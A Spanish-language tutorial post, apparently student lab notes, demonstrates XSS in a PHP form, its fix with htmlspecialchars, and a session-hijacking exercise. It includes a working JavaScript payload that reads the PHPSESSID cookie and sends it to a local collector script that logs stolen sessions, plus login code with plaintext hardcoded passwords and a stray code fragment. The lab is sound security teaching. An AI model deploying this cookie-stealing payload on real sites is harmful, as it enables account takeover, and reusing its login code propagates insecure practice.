---

typora-copy-images-to: ../assets/img/
typora-root-url: ../
layout: post
categories: 
conToc: true
title: Validación
---



## Validación

Primero, deberemos crear el fichero post.php:

```php+HTML
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo $_POST["textarea"] ?? "";
?>
</body>
</html>
```

Ahora accederemos a localhost:8080/public_html/post.php y veremos el formulario 

![image-20220501105612803](/assets/img/image-20220501105612803.png)



En el formulario pondremos lo siguiente:

```php
<script>alert('hackeado')</script>
```

![image-20220501105636574](/assets/img/image-20220501105636574.png)



Para remediar este tipo de ataques, deberemos añadir lo siguiente a nuestro php:

```php+HTML
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo htmlspecialchars($_POST["textarea"]) ?? "";
?>
</html>
```

![image-20220501105715016](/assets/img/image-20220501105715016.png)

Lo siguiente que realizaremos es un robo de sesión, para ello, deberemos crear los siguientes ficheros:

- robo-de-sesion.php:

- robo-de-sesion.php:

  ```php+HTML
  <?php
  $session_robada = $_GET['session_robada'] ?? "";
  $session_robada .= "\n";
  $fichero = 'data/sessions.txt';
  // Abre el fichero para obtener el contenido existente
  $actual = file_get_contents($fichero);
  // Escribe el contenido al fichero
  file_put_contents($fichero, $session_robada, FILE_APPEND);
  ```

  

- login.php

  ```php+HTML
  <?php
  session_start();
  
  //En una aplicación real, los usuarios estarían almaenados en la base de datos
  $all_users = array ("mario" => "qwerty", "juan" => "123456");
  $valid_users = array_keys($all_users);
  
  $ya_registrado = $_SESSION['ya_registrado'] ?? false;
  
  
  if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
  	$usuario = $_POST['usuario'] ?? "";
  	$password = $_POST['password'] ?? "";
      
  	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $all_users[$usuario]);
  	if ($ya_registrado){login.php
  		$_SESSION['ya_registrado'] = true;
  		$_SESSION['usuario'] = $usuario;
  	}
  }
  
  if ($ya_registrado){
  	// Si llega aqui es porque es un usuario válido.
  	echo "<p>Welcome " . $_SESSION['usuario'] . "</p>";
  	echo "<p>Congratulations, you are into the system.</p>";
  }else{
  ?>
  	
  	<form action='login.php' method='post'>
  		Usuario: <input type='text' name = "usuario" id="usuario" value=""><br>
  		Contraseña: <input type='password' name = "password" id = "password" value=""><br>
  		<input type='submit' value='Enviar'>
  	</form>
  <?php
  }
  ?>
  ```

  

- logout.php

  ```php+HTML
  <?php
  //logout.php
  session_start();
  session_unset();
  session_destroy();
  //redirigimos a login.php
  header('Location: login.php');
  ```

  

- hackeada.php

  ```php+HTML
  <!DOCTYPE html>
  <html lang="es">
  <head>
  <meta charset="utf-8">
  </head>
  <body>
      Esta es una página que ha sido hackeada mediante XSS.
  Al acceder, envía la cookie de sesión al sitio http://evil.local
  <script>
  var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
  var myImage = new Image(1,1);
  myImage.src = "http://127.0.0.1:8081/robo-de-sesion.php?session_robada=" + c;
  </script>
  </body>
  </html>
  ```

Lo siguiente que haremos, será entrar a login.php, e inicieramos sesión con el usuario: Juan y la Contraseña: 123456

![image-20220501105938285](/assets/img/image-20220501105938285.png)

Como podemos ver:

![image-20220501110001737](/assets/img/image-20220501110001737.png)

Lo siguiente que haremos, será abrir  el Developer Tools, y aquí accederemos al apartado de Red y copiaremos la Coockie

![image-20220501110437756](/assets/img/image-20220501110437756.png)

Lo siguiente que haremos será en el Developer Tools, y deberemos editarlo cambiando la cookie, y poniendo la que hemos extraído antes.

![image-20220501115535101](/assets/img/image-20220501115535101.png)

Y como podemos ver, hemos podido iniciar sesión, con la sesión de Juan sin poner ninguna contraseña:

![image-20220501115559246](/assets/img/image-20220501115559246.png)